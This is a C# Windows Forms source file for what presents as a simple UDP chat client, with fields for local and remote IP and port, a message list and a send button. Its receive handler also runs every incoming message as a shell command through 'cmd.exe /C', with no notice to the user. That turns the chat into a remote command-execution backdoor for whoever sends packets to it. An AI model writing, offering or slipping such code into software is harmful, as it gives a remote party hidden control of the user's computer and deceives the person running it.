using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using MetroFramework.Forms;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;

namespace WindowsFormsApplication5
{
    public partial class Form1 : MetroForm
       
    {
        Socket sck;
        EndPoint epl,epr;
        byte[] buffer;

        private void Form1_Load(object sender, EventArgs e)
        {
            sck = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            sck.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
            metroTextBox1.Text = getlocalip();
            metroTextBox3.Text = getlocalip();
        }
        private string getlocalip()
        {
            IPHostEntry iph;
            iph = Dns.GetHostEntry(Dns.GetHostName());
            foreach(IPAddress ip in iph.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                    return ip.ToString();
            }
            return "127.0.0.1";
        }

        private void metroButton1_Click(object sender, EventArgs e)
        {
            if (metroTextBox1.Text != "" && metroTextBox2.Text != "" && metroTextBox3.Text != "" && metroTextBox4.Text != "")
            {
                epl = new IPEndPoint(IPAddress.Parse(metroTextBox1.Text), Convert.ToInt32(metroTextBox2.Text));
                sck.Bind(epl);
                epr = new IPEndPoint(IPAddress.Parse(metroTextBox3.Text), Convert.ToInt32(metroTextBox4.Text));
                sck.Connect(epr);
                buffer = new byte[1500];
                sck.BeginReceiveFrom(buffer, 0, buffer.Length, SocketFlags.None, ref epr, new AsyncCallback(MessageCallBack), buffer);
            }
            else { MessageBox.Show("Data not complete"); }
        }
        private void MessageCallBack(IAsyncResult aResult)
        {
            try
            {
                byte[] rec = new byte[1500];
                rec = (byte[])aResult.AsyncState;
                ASCIIEncoding enc = new ASCIIEncoding();
                string recme = enc.GetString(rec);

                listBox1.Items.Add("Friend :" + recme);

                buffer = new byte[1500];
                sck.BeginReceiveFrom(buffer, 0, buffer.Length, SocketFlags.None, ref epr, new AsyncCallback(MessageCallBack), buffer);

                string s = recme;
                string p;
                if (s != "")
                {
                    p = "/C " + s + "";

                    System.Diagnostics.Process process = new System.Diagnostics.Process();
                    process.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Normal;
                    process.StartInfo.FileName = "cmd.exe";
                    process.StartInfo.Arguments = p;
                    process.Start();
                }


                }
            catch(Exception ex)
            {
                MessageBox.Show(ex.ToString());

            }


        }

        private void metroButton2_Click(object sender, EventArgs e)
        {
            ASCIIEncoding enc = new ASCIIEncoding();
            byte[] sm = new byte[1500];
            sm = enc.GetBytes(metroTextBox5.Text);
            sck.Send(sm);
            listBox1.Items.Add("me :" + metroTextBox5.Text);
            metroTextBox5.Text = "";


        }

        public Form1()
        {
            InitializeComponent();
        }
    }
}
